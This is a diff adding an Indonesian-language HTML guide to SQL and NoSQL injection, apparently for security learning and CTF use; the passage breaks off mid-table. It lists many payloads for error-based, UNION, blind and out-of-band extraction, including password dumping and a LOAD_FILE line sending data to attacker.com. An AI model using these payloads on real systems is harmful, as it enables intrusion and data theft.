@@ -1,0 +1,1485 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SQL Injection Documentation - Complete Guide</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #0f0f23;
+            color: #cccccc;
+            line-height: 1.8;
+        }
+
+        .container {
+            display: flex;
+            min-height: 100vh;
+        }
+
+        /* Sidebar */
+        .sidebar {
+            width: 300px;
+            background: #1a1a2e;
+            padding: 20px;
+            position: fixed;
+            height: 100vh;
+            overflow-y: auto;
+            border-right: 1px solid #16213e;
+        }
+
+        .sidebar h2 {
+            color: #e94560;
+            margin-bottom: 20px;
+            font-size: 1.5rem;
+            padding-bottom: 10px;
+            border-bottom: 2px solid #e94560;
+        }
+
+        .sidebar ul {
+            list-style: none;
+        }
+
+        .sidebar ul li {
+            margin: 3px 0;
+        }
+
+        .sidebar ul li a {
+            color: #cccccc;
+            text-decoration: none;
+            display: block;
+            padding: 8px 15px;
+            border-radius: 5px;
+            transition: all 0.3s;
+            font-size: 0.9rem;
+        }
+
+        .sidebar ul li a:hover {
+            background: #16213e;
+            color: #e94560;
+        }
+
+        .sidebar ul li a.active {
+            background: #e94560;
+            color: white;
+        }
+
+        .sidebar .section-title {
+            color: #00d9ff;
+            font-size: 0.75rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-top: 20px;
+            margin-bottom: 5px;
+            padding-left: 15px;
+        }
+
+        /* Main Content */
+        .main-content {
+            margin-left: 300px;
+            padding: 40px;
+            flex: 1;
+            max-width: 1100px;
+        }
+
+        h1, h2, h3, h4 {
+            color: #e94560;
+            margin-bottom: 15px;
+        }
+
+        h1 {
+            font-size: 2.5rem;
+            border-bottom: 3px solid #e94560;
+            padding-bottom: 15px;
+            margin-bottom: 30px;
+        }
+
+        h2 {
+            font-size: 1.8rem;
+            margin-top: 50px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid #16213e;
+        }
+
+        h3 {
+            font-size: 1.3rem;
+            margin-top: 30px;
+            color: #ff6b6b;
+        }
+
+        h4 {
+            font-size: 1.1rem;
+            margin-top: 20px;
+            color: #00d9ff;
+        }
+
+        p {
+            margin-bottom: 15px;
+            text-align: justify;
+        }
+
+        /* Code Blocks */
+        code {
+            background: #16213e;
+            padding: 3px 8px;
+            border-radius: 4px;
+            font-family: 'Fira Code', 'Consolas', monospace;
+            color: #00d9ff;
+            font-size: 0.85rem;
+        }
+
+        pre {
+            background: #16213e;
+            padding: 20px;
+            border-radius: 8px;
+            overflow-x: auto;
+            margin: 15px 0;
+            border-left: 4px solid #e94560;
+        }
+
+        pre code {
+            background: none;
+            padding: 0;
+            color: #00ff88;
+            font-size: 0.85rem;
+        }
+
+        /* Tables */
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+            background: #1a1a2e;
+            border-radius: 8px;
+            overflow: hidden;
+        }
+
+        th {
+            background: #e94560;
+            color: white;
+            padding: 12px 15px;
+            text-align: left;
+            font-size: 0.9rem;
+        }
+
+        td {
+            padding: 10px 15px;
+            border-bottom: 1px solid #16213e;
+            font-size: 0.9rem;
+        }
+
+        tr:hover {
+            background: #16213e;
+        }
+
+        /* Info Boxes */
+        .info-box {
+            background: #16213e;
+            border-left: 4px solid #00d9ff;
+            padding: 15px 20px;
+            margin: 20px 0;
+            border-radius: 0 8px 8px 0;
+        }
+
+        .warning-box {
+            background: #2d1810;
+            border-left: 4px solid #ff6b6b;
+            padding: 15px 20px;
+            margin: 20px 0;
+            border-radius: 0 8px 8px 0;
+        }
+
+        .tip-box {
+            background: #0d2818;
+            border-left: 4px solid #00ff88;
+            padding: 15px 20px;
+            margin: 20px 0;
+            border-radius: 0 8px 8px 0;
+        }
+
+        .example-box {
+            background: #1a1a2e;
+            border: 1px solid #e94560;
+            padding: 20px;
+            margin: 20px 0;
+            border-radius: 8px;
+        }
+
+        /* Cards */
+        .card-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 20px;
+            margin: 20px 0;
+        }
+
+        .card {
+            background: #1a1a2e;
+            padding: 20px;
+            border-radius: 10px;
+            border: 1px solid #16213e;
+            transition: transform 0.3s, box-shadow 0.3s;
+        }
+
+        .card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 30px rgba(233, 69, 96, 0.2);
+        }
+
+        .card h3 {
+            margin-top: 0;
+            font-size: 1.1rem;
+        }
+
+        .card p {
+            font-size: 0.9rem;
+        }
+
+        /* Badge */
+        .badge {
+            display: inline-block;
+            padding: 3px 10px;
+            border-radius: 20px;
+            font-size: 0.75rem;
+            font-weight: bold;
+            margin-right: 8px;
+        }
+
+        .badge-danger { background: #e94560; color: white; }
+        .badge-warning { background: #ff9f43; color: #1a1a2e; }
+        .badge-info { background: #00d9ff; color: #1a1a2e; }
+        .badge-success { background: #00ff88; color: #1a1a2e; }
+
+        /* Scrollbar */
+        ::-webkit-scrollbar {
+            width: 8px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: #1a1a2e;
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: #e94560;
+            border-radius: 4px;
+        }
+
+        /* Section */
+        section {
+            margin-bottom: 60px;
+        }
+
+        ul, ol {
+            margin-left: 25px;
+            margin-bottom: 15px;
+        }
+
+        li {
+            margin-bottom: 8px;
+        }
+
+        /* Tabs */
+        .tab-container {
+            margin: 20px 0;
+        }
+
+        .tab-buttons {
+            display: flex;
+            gap: 5px;
+            margin-bottom: 0;
+        }
+
+        .tab-btn {
+            background: #16213e;
+            color: #cccccc;
+            border: none;
+            padding: 10px 20px;
+            cursor: pointer;
+            border-radius: 8px 8px 0 0;
+            transition: all 0.3s;
+        }
+
+        .tab-btn.active {
+            background: #e94560;
+            color: white;
+        }
+
+        .tab-content {
+            display: none;
+            background: #16213e;
+            padding: 20px;
+            border-radius: 0 8px 8px 8px;
+        }
+
+        .tab-content.active {
+            display: block;
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .sidebar {
+                width: 100%;
+                position: relative;
+                height: auto;
+            }
+
+            .main-content {
+                margin-left: 0;
+            }
+
+            .container {
+                flex-direction: column;
+            }
+        }
+
+        /* Reference links */
+        a {
+            color: #00d9ff;
+            text-decoration: none;
+        }
+
+        a:hover {
+            color: #e94560;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Sidebar Navigation -->
+        <nav class="sidebar">
+            <h2>SQLi Docs</h2>
+            <ul>
+                <div class="section-title">Pendahuluan</div>
+                <li><a href="#intro">Pendahuluan</a></li>
+                <li><a href="#what-is-sqli">Apa itu SQL Injection?</a></li>
+                <li><a href="#impact">Dampak Serangan</a></li>
+
+                <div class="section-title">Jenis SQL Injection</div>
+                <li><a href="#types">Klasifikasi SQLi</a></li>
+                <li><a href="#in-band">In-Band SQLi</a></li>
+                <li><a href="#error-based">Error-Based</a></li>
+                <li><a href="#union-based">Union-Based</a></li>
+                <li><a href="#blind-sqli">Blind SQLi</a></li>
+                <li><a href="#boolean-based">Boolean-Based</a></li>
+                <li><a href="#time-based">Time-Based</a></li>
+                <li><a href="#out-of-band">Out-of-Band SQLi</a></li>
+
+                <div class="section-title">NoSQL & Advanced</div>
+                <li><a href="#nosql">NoSQL Injection</a></li>
+                <li><a href="#techniques">Teknik Lanjutan</a></li>
+                <li><a href="#second-order">Second-Order SQLi</a></li>
+
+                <div class="section-title">Referensi</div>
+                <li><a href="#cheatsheet">SQLi Cheat Sheet</a></li>
+                <li><a href="#payloads">Kumpulan Payload</a></li>
+                <li><a href="#tools">Tools Exploitasi</a></li>
+                <li><a href="#prevention">Pencegahan</a></li>
+            </ul>
+        </nav>
+
+        <!-- Main Content -->
+        <main class="main-content">
+            <!-- Intro Section -->
+            <section id="intro">
+                <h1>SQL Injection Documentation</h1>
+                <p>Dokumentasi lengkap tentang SQL Injection berdasarkan referensi dari <strong>OWASP</strong>, <strong>PortSwigger Web Security Academy</strong>, dan sumber terpercaya lainnya. Materi ini untuk keperluan pembelajaran security, CTF, dan penetration testing authorized.</p>
+
+                <div class="warning-box">
+                    <strong>Disclaimer:</strong> Materi ini hanya untuk tujuan edukasi dan security testing yang authorized. Penggunaan tanpa izin adalah ilegal dan dapat dikenai hukum.
+                </div>
+            </section>
+
+            <!-- What is SQLi -->
+            <section id="what-is-sqli">
+                <h2>Apa itu SQL Injection?</h2>
+                <p>Menurut <strong>OWASP</strong>, SQL Injection (SQLi) adalah serangan yang terdiri dari penyisipan atau "injection" query SQL melalui input data dari client ke aplikasi. Serangan ini memanfaatkan fakta bahwa SQL tidak membedakan secara nyata antara <em>control plane</em> dan <em>data plane</em>.</p>
+
+                <p><strong>PortSwigger</strong> mendefinisikan SQLi sebagai kerentanan keamanan web yang memungkinkan attacker mengganggu query yang dibuat aplikasi ke database-nya.</p>
+
+                <h3>Cara Kerja SQL Injection</h3>
+                <div class="example-box">
+                    <h4>Contoh dari PortSwigger Web Security Academy:</h4>
+                    <p>Aplikasi shopping yang menampilkan produk berdasarkan kategori:</p>
+                    <pre><code>-- URL request
+https://insecure-website.com/products?category=Gifts
+
+-- Query yang dibuat aplikasi
+SELECT * FROM products WHERE category = 'Gifts' AND released = 1
+
+-- Serangan SQL Injection
+https://insecure-website.com/products?category=Gifts'--
+
+-- Query hasil injection
+SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
+-- Komentar (--) menghapus "AND released = 1", menampilkan SEMUA produk termasuk unreleased</code></pre>
+                </div>
+
+                <h3>Kondisi yang Menyebabkan Kerentanan</h3>
+                <ul>
+                    <li>Data tidak terpercaya masuk ke program dari sumber eksternal</li>
+                    <li>Data tersebut digunakan untuk membangun query SQL secara dinamis</li>
+                    <li>Input user langsung digabung (concatenate) ke query string tanpa validasi</li>
+                    <li>Error database ditampilkan ke user (information disclosure)</li>
+                </ul>
+
+                <h3>Lokasi SQL Injection dalam Query</h3>
+                <p>Menurut PortSwigger, SQL injection dapat terjadi di berbagai bagian query, bukan hanya di WHERE clause:</p>
+                <ul>
+                    <li><code>WHERE</code> clause pada <code>SELECT</code> statement</li>
+                    <li><code>UPDATE</code> statements - dalam values atau <code>WHERE</code> clause</li>
+                    <li><code>INSERT</code> statements - dalam inserted values</li>
+                    <li><code>SELECT</code> statements - dalam table atau column name</li>
+                    <li><code>ORDER BY</code> clause</li>
+                </ul>
+            </section>
+
+            <!-- Impact -->
+            <section id="impact">
+                <h2>Dampak Serangan SQL Injection</h2>
+                <p>Berdasarkan <strong>OWASP</strong>, dampak serangan SQL injection mencakup:</p>
+
+                <div class="card-grid">
+                    <div class="card">
+                        <h3><span class="badge badge-danger">Critical</span> Confidentiality</h3>
+                        <p>Pencurian data sensitif dari database (password, credit card, informasi pribadi).</p>
+                    </div>
+                    <div class="card">
+                        <h3><span class="badge badge-danger">Critical</span> Authentication</h3>
+                        <p>Bypass authentication, login sebagai user lain tanpa mengetahui password.</p>
+                    </div>
+                    <div class="card">
+                        <h3><span class="badge badge-warning">High</span> Authorization</h3>
+                        <p>Mengubah informasi otorisasi, privilege escalation.</p>
+                    </div>
+                    <div class="card">
+                        <h3><span class="badge badge-warning">High</span> Integrity</h3>
+                        <p>Modifikasi atau penghapusan data tanpa otorisasi.</p>
+                    </div>
+                    <div class="card">
+                        <h3><span class="badge badge-info">Medium</span> Admin Access</h3>
+                        <p>Menjadi administrator database server.</p>
+                    </div>
+                    <div class="card">
+                        <h3><span class="badge badge-danger">Critical</span> RCE</h3>
+                        <p>Remote Code Execution pada beberapa database (MSSQL xp_cmdshell, dll).</p>
+                    </div>
+                </div>
+
+                <div class="info-box">
+                    <strong>PortSwigger:</strong> Serangan SQL injection telah digunakan dalam banyak data breach high-profile selama bertahun-tahun, menyebabkan kerusakan reputasi dan denda regulasi. Dalam beberapa kasus, attacker bisa mendapatkan backdoor persisten ke sistem organisasi.
+                </div>
+            </section>
+
+            <!-- Types of SQLi -->
+            <section id="types">
+                <h2>Klasifikasi SQL Injection</h2>
+                <p>SQL Injection diklasifikasikan berdasarkan bagaimana hasilnya dikembalikan ke attacker:</p>
+
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Kategori</th>
+                            <th>Type</th>
+                            <th>Deskripsi</th>
+                            <th>Visibility</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td rowspan="2"><strong>In-Band</strong></td>
+                            <td>Error-Based</td>
+                            <td>Data diekstrak dari error messages</td>
+                            <td>Visible</td>
+                        </tr>
+                        <tr>
+                            <td>Union-Based</td>
+                            <td>Menggunakan UNION untuk menggabungkan hasil</td>
+                            <td>Visible</td>
+                        </tr>
+                        <tr>
+                            <td rowspan="2"><strong>Blind (Inferential)</strong></td>
+                            <td>Boolean-Based</td>
+                            <td>Inferensi dari TRUE/FALSE response</td>
+                            <td>Tidak Visible</td>
+                        </tr>
+                        <tr>
+                            <td>Time-Based</td>
+                            <td>Inferensi dari response time delays</td>
+                            <td>Tidak Visible</td>
+                        </tr>
+                        <tr>
+                            <td><strong>Out-of-Band</strong></td>
+                            <td>OOB SQLi</td>
+                            <td>Ekstraksi data via channel berbeda (DNS, HTTP)</td>
+                            <td>External</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </section>
+
+            <!-- In-Band SQLi -->
+            <section id="in-band">
+                <h2>In-Band SQL Injection</h2>
+                <p>In-Band SQL Injection adalah jenis yang paling umum dan mudah dieksploitasi. Attacker menggunakan channel komunikasi yang sama untuk menyerang dan mendapatkan hasil.</p>
+            </section>
+
+            <!-- Error-Based SQLi -->
+            <section id="error-based">
+                <h2>Error-Based SQL Injection</h2>
+                <p>Serangan yang memanfaatkan error message dari database untuk mengekstrak informasi struktur database dan datanya.</p>
+
+                <h3>MySQL Error-Based</h3>
+                <pre><code>-- EXTRACTVALUE - Extract database version
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))--
+-- Output: XPATH syntax error: '~8.0.23~'
+
+-- Extract database name
+' AND EXTRACTVALUE(1,CONCAT(0x7e,DATABASE(),0x7e))--
+
+-- Extract table names
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=DATABASE()),0x7e))--
+
+-- Extract column names
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'),0x7e))--
+
+-- UPDATEXML alternative
+' AND UPDATEXML(1,CONCAT(0x7e,(SELECT password FROM users LIMIT 1),0x7e),1)--</code></pre>
+
+                <h3>PostgreSQL Error-Based</h3>
+                <pre><code>-- CAST error untuk extract data
+' AND 1=CAST((SELECT version()) AS INT)--
+-- Output: invalid input syntax for integer: "PostgreSQL 13.3..."
+
+-- Extract table name
+' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS INT)--</code></pre>
+
+                <h3>SQL Server Error-Based</h3>
+                <pre><code>-- CONVERT error
+' AND 1=CONVERT(INT,(SELECT @@version))--
+
+-- CAST error
+' AND 1=CAST((SELECT TOP 1 table_name FROM information_schema.tables) AS INT)--
+
+-- Extract dengan TOP
+' AND 1=CONVERT(INT,(SELECT TOP 1 password FROM users))--</code></pre>
+
+                <h3>Oracle Error-Based</h3>
+                <pre><code>-- CTXSYS.DRITHSX.SN
+' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--
+
+-- UTL_INADDR.GET_HOST_NAME
+' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT banner FROM v$version WHERE ROWNUM=1))--</code></pre>
+            </section>
+
+            <!-- Union-Based SQLi -->
+            <section id="union-based">
+                <h2>Union-Based SQL Injection</h2>
+                <p>Menggunakan operator <code>UNION</code> untuk menggabungkan hasil query attacker dengan query asli. Teknik ini memungkinkan pengambilan data dari tabel lain.</p>
+
+                <div class="info-box">
+                    <strong>Syarat UNION (PortSwigger):</strong>
+                    <ul>
+                        <li>Jumlah kolom harus sama di kedua query</li>
+                        <li>Tipe data kolom harus compatible di setiap posisi</li>
+                    </ul>
+                </div>
+
+                <h3>Step 1: Menentukan Jumlah Kolom</h3>
+                <pre><code>-- ORDER BY technique - increment until error
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+' ORDER BY 4--  -- Error = hanya 3 kolom
+
+-- UNION NULL technique
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--  -- Jika tidak error = 3 kolom</code></pre>
+
+                <h3>Step 2: Menemukan Kolom dengan Tipe Data yang Sesuai</h3>
+                <pre><code>-- Test kolom mana yang bisa menampilkan string
+' UNION SELECT 'a',NULL,NULL--
+' UNION SELECT NULL,'a',NULL--
+' UNION SELECT NULL,NULL,'a'--
+
+-- Jika kolom 2 bisa menampilkan string
+' UNION SELECT NULL,'test',NULL--</code></pre>
+
+                <h3>Step 3: Ekstraksi Data</h3>
+                <pre><code>-- Database information
+' UNION SELECT NULL,database(),version()--
+' UNION SELECT NULL,user(),@@version--
+
+-- Table names (MySQL)
+' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema=database()--
+
+-- Column names (MySQL)
+' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--
+
+-- Extract data
+' UNION SELECT NULL,username,password FROM users--
+' UNION SELECT NULL,CONCAT(username,':',password),NULL FROM users--</code></pre>
+
+                <h3>Database-Specific Enumeration Queries</h3>
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Database</th>
+                            <th>Version</th>
+                            <th>Current User</th>
+                            <th>Current DB</th>
+                            <th>Tables</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td><strong>MySQL</strong></td>
+                            <td><code>SELECT @@version</code></td>
+                            <td><code>SELECT user()</code></td>
+                            <td><code>SELECT database()</code></td>
+                            <td><code>information_schema.tables</code></td>
+                        </tr>
+                        <tr>
+                            <td><strong>PostgreSQL</strong></td>
+                            <td><code>SELECT version()</code></td>
+                            <td><code>SELECT current_user</code></td>
+                            <td><code>SELECT current_database()</code></td>
+                            <td><code>information_schema.tables</code></td>
+                        </tr>
+                        <tr>
+                            <td><strong>SQL Server</strong></td>
+                            <td><code>SELECT @@version</code></td>
+                            <td><code>SELECT SYSTEM_USER</code></td>
+                            <td><code>SELECT DB_NAME()</code></td>
+                            <td><code>information_schema.tables</code></td>
+                        </tr>
+                        <tr>
+                            <td><strong>Oracle</strong></td>
+                            <td><code>SELECT banner FROM v$version</code></td>
+                            <td><code>SELECT USER FROM DUAL</code></td>
+                            <td><code>SELECT global_name FROM global_name</code></td>
+                            <td><code>SELECT table_name FROM all_tables</code></td>
+                        </tr>
+                        <tr>
+                            <td><strong>SQLite</strong></td>
+                            <td><code>SELECT sqlite_version()</code></td>
+                            <td>-</td>
+                            <td><code>SELECT name FROM pragma_database_list</code></td>
+                            <td><code>SELECT name FROM sqlite_master WHERE type='table'</code></td>
+                        </tr>
+                    </tbody>
+                </table>
+
+                <h3>String Concatenation (PortSwigger Cheat Sheet)</h3>
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Database</th>
+                            <th>Query</th>
+                            <th>Result</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td>Oracle</td>
+                            <td><code>'foo'||'bar'</code></td>
+                            <td>foobar</td>
+                        </tr>
+                        <tr>
+                            <td>Microsoft</td>
+                            <td><code>'foo'+'bar'</code></td>
+                            <td>foobar</td>
+                        </tr>
+                        <tr>
+                            <td>PostgreSQL</td>
+                            <td><code>'foo'||'bar'</code></td>
+                            <td>foobar</td>
+                        </tr>
+                        <tr>
+                            <td>MySQL</td>
+                            <td><code>'foo' 'bar'</code> (space) atau <code>CONCAT('foo','bar')</code></td>
+                            <td>foobar</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </section>
+
+            <!-- Blind SQLi -->
+            <section id="blind-sqli">
+                <h2>Blind SQL Injection</h2>
+                <p>Menurut <strong>PortSwigger</strong>, Blind SQL injection terjadi ketika aplikasi tidak menampilkan hasil query atau error database dalam responsnya. Teknik yang lebih kompleks diperlukan untuk mengeksploitasi.</p>
+
+                <div class="info-box">
+                    <strong>Teknik untuk Blind SQLi (PortSwigger):</strong>
+                    <ol>
+                        <li>Mengubah logic query untuk memicu perbedaan response (TRUE/FALSE)</li>
+                        <li>Memicu time delay untuk inferensi berdasarkan response time</li>
+                        <li>Memicu out-of-band network interaction (OAST)</li>
+                    </ol>
+                </div>
+            </section>
+
+            <!-- Boolean-Based SQLi -->
+            <section id="boolean-based">
+                <h2>Boolean-Based (Blind) SQL Injection</h2>
+                <p>Serangan di mana attacker menyimpulkan data dari perbedaan response TRUE vs FALSE.</p>
+
+                <h3>Konsep Dasar</h3>
+                <pre><code>-- TRUE condition - response normal/berbeda dari FALSE
+' AND 1=1--
+
+-- FALSE condition - response berbeda
+' AND 1=2--
+
+-- Jika response berbeda, maka vulnerable</code></pre>
+
+                <h3>Subverting Application Logic</h3>
+                <div class="example-box">
+                    <h4>Contoh dari PortSwigger - Login Bypass:</h4>
+                    <pre><code>-- Query normal
+SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
+
+-- Dengan injection: username = administrator'--
+SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
+
+-- Password check dihilangkan oleh komentar (--)
+-- Attacker login sebagai administrator tanpa password</code></pre>
+                </div>
+
+                <h3>Teknik Ekstraksi Data Karakter-per-Karakter</h3>
+                <pre><code>-- Cek panjang data
+' AND (SELECT LENGTH(password) FROM users WHERE username='admin')=32--
+
+-- Extract karakter per posisi dengan SUBSTRING
+' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--
+' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='admin')='b'--
+
+-- Menggunakan ASCII dengan binary search (lebih efisien)
+' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin')>64--
+' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin')>96--
+' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin')>112--
+' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin')=97--</code></pre>
+
+                <h3>Substring Functions per Database</h3>
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Database</th>
+                            <th>Function</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td>Oracle</td>
+                            <td><code>SUBSTR('foobar', 4, 2)</code></td>
+                        </tr>
+                        <tr>
+                            <td>Microsoft</td>
+                            <td><code>SUBSTRING('foobar', 4, 2)</code></td>
+                        </tr>
+                        <tr>
+                            <td>PostgreSQL</td>
+                            <td><code>SUBSTRING('foobar', 4, 2)</code></td>
+                        </tr>
+                        <tr>
+                            <td>MySQL</td>
+                            <td><code>SUBSTRING('foobar', 4, 2)</code></td>
+                        </tr>
+                    </tbody>
+                </table>
+
+                <div class="tip-box">
+                    <strong>Tip:</strong> Dengan binary search, hanya butuh ~7 request untuk menemukan 1 karakter (dibanding ~128 request dengan linear search).
+                </div>
+
+                <h3>Conditional Errors (PortSwigger)</h3>
+                <pre><code>-- Oracle - trigger error jika kondisi TRUE
+SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual
+
+-- Microsoft
+SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END
+
+-- PostgreSQL
+1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)
+
+-- MySQL
+SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')</code></pre>
+            </section>
+
+            <!-- Time-Based SQLi -->
+            <section id="time-based">
+                <h2>Time-Based (Blind) SQL Injection</h2>
+                <p>Serangan di mana attacker menyimpulkan data dari waktu response (delay). Berguna ketika tidak ada perbedaan response antara TRUE dan FALSE.</p>
+
+                <h3>Time Delays (PortSwigger Cheat Sheet)</h3>
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Database</th>
+                            <th>Unconditional Delay (10 detik)</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td>Oracle</td>
+                            <td><code>dbms_pipe.receive_message(('a'),10)</code></td>
+                        </tr>
+                        <tr>
+                            <td>Microsoft</td>
+                            <td><code>WAITFOR DELAY '0:0:10'</code></td>
+                        </tr>
+                        <tr>
+                            <td>PostgreSQL</td>
+                            <td><code>SELECT pg_sleep(10)</code></td>
+                        </tr>
+                        <tr>
+                            <td>MySQL</td>
+                            <td><code>SELECT SLEEP(10)</code></td>
+                        </tr>
+                    </tbody>
+                </table>
+
+                <h3>Conditional Time Delays</h3>
+                <pre><code>-- MySQL
+' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64,SLEEP(5),0)--
+
+-- PostgreSQL
+' AND SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END--
+
+-- Microsoft
+'; IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'--
+
+-- Oracle
+' AND SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual--</code></pre>
+
+                <h3>MySQL Time-Based Techniques</h3>
+                <pre><code>-- SLEEP function
+' AND SLEEP(5)--
+' AND IF(1=1,SLEEP(5),0)--
+
+-- BENCHMARK function (alternative)
+' AND BENCHMARK(10000000,SHA1('test'))--
+
+-- Conditional dengan data extraction
+' AND IF((SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a',SLEEP(5),0)--</code></pre>
+
+                <div class="warning-box">
+                    <strong>Perhatian:</strong> Time-based SQLi menghasilkan banyak request dan bisa terdeteksi. Gunakan delay yang konsisten (misal 5 detik) untuk menghindari false positive dari network latency.
+                </div>
+            </section>
+
+            <!-- Out-of-Band SQLi -->
+            <section id="out-of-band">
+                <h2>Out-of-Band SQL Injection</h2>
+                <p>Serangan yang menggunakan channel berbeda (DNS, HTTP request) untuk mengekstraksi data. Sangat powerful dan bekerja ketika teknik lain tidak bisa.</p>
+
+                <h3>DNS Lookup (PortSwigger Cheat Sheet)</h3>
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Database</th>
+                            <th>Payload</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td>Oracle</td>
+                            <td><code>SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')</code></td>
+                        </tr>
+                        <tr>
+                            <td>Microsoft</td>
+                            <td><code>exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'</code></td>
+                        </tr>
+                        <tr>
+                            <td>PostgreSQL</td>
+                            <td><code>copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'</code></td>
+                        </tr>
+                        <tr>
+                            <td>MySQL (Windows)</td>
+                            <td><code>LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')</code></td>
+                        </tr>
+                    </tbody>
+                </table>
+
+                <h3>DNS Lookup dengan Data Exfiltration</h3>
+                <pre><code>-- Oracle
+SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
+
+-- Microsoft
+declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);
+exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')
+
+-- MySQL (Windows)
+' AND LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\test'))--</code></pre>
+
+                <div class="tip-box">
+                    <strong>Tools untuk OOB:</strong> Gunakan Burp Collaborator atau server sendiri dengan logging untuk menangkap OOB requests.
+                </div>
+            </section>
+
+            <!-- NoSQL Injection -->
+            <section id="nosql">
+                <h2>NoSQL Injection</h2>
+                <p>Serangan injection pada database NoSQL (MongoDB, CouchDB, Redis, dll) yang memiliki karakteristik berbeda dari SQL tradisional.</p>
+
+                <h3>MongoDB Injection</h3>
+                <pre><code>// Normal query
+{ "username": "admin", "password": "password123" }
+
+// Auth bypass dengan $ne (not equal)
+{ "username": "admin", "password": { "$ne": "" } }
+{ "username": "admin", "password": { "$ne": "wrong" } }
+
+// $gt (greater than) - bypass
+{ "username": "admin", "password": { "$gt": "" } }
+
+// $regex - pattern matching
+{ "username": "admin", "password": { "$regex": "^a" } }
+{ "username": "admin", "password": { "$regex": ".*" } }
+
+// $where - JavaScript injection (BERBAHAYA)
+{ "$where": "this.password.match(/.*/)" }
+{ "$where": "return this.username == 'admin'" }
+{ "$where": "sleep(5000)" }  // Time-based</code></pre>
+
+                <h3>URL Parameter Injection</h3>
+                <pre><code>// Normal
+?username=admin&password=password123
+
+// Injection via URL parameter
+?username=admin&password[$ne]=wrong
+?username[$ne]=admin&password[$ne]=wrong
+?username[$regex]=^a.*&password[$ne]=wrong
+
+// Array injection
+?username[]=admin&password[]=password</code></pre>
+
+                <h3>MongoDB Operators</h3>
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Operator</th>
+                            <th>Deskripsi</th>
+                            <th>Contoh</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td><code>$ne</code></td>
+                            <td>Not Equal</td>
